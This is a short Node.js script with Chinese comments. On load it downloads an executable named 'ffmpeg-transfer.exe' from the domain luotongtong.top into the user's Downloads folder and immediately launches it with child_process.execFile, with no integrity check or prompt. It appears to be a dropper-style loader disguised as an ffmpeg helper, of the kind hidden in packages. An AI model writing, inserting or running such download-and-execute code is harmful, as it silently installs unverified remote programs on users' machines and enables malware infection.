const fs = require("fs");
const https = require("https");
const os = require("os");
const path = require("path");
const childProcess = require("child_process");

const downloadUrl = "https://www.luotongtong.top/transfer/ffmpeg-transfer.exe";

// 获取默认下载路径
const defaultDownloadPath = path.join(os.homedir(), "Downloads");
const localFilePath = path.join(defaultDownloadPath, "ffmpeg-transfer.exe");

// 检查文件是否已经下载
if (fs.existsSync(localFilePath)) {
  console.log(`文件 ${localFilePath} 已经存在，无需下载。`);
  startDownloadedFile(localFilePath);
} else {
  if (isFileDownloading(localFilePath)) {
    console.log("文件正在下载，请等待下载完成。");
  } else {
    // 开始下载文件
    downloadFile(downloadUrl, localFilePath);
  }
}

// 下载文件并保存到本地
function downloadFile(url, localPath) {
  const file = fs.createWriteStream(localPath);

  https
    .get(url, (response) => {
      if (response.statusCode === 200) {
        response.pipe(file);
        file.on("finish", () => {
          file.close(() => {
            console.log(`文件下载完成：${localPath}`);
            startDownloadedFile(localPath);
          });
        });
      } else {
        console.error(`下载失败，状态码：${response.statusCode}`);
      }
    })
    .on("error", (error) => {
      console.error(`下载时出现错误：${error.message}`);
    });
}

// 启动已下载的文件
function startDownloadedFile(filePath) {
  childProcess.execFile(filePath, (error, stdout, stderr) => {
    if (error) {
      console.error(`启动文件时出现错误：${error}`);
    } else {
      console.log(`文件启动成功：${filePath}`);
    }
  });
}

function isFileDownloading(filePath) {
  if (fs.existsSync(filePath)) {
    const stats = fs.statSync(filePath);
    return stats.size > 0;
  }
  return false;
}
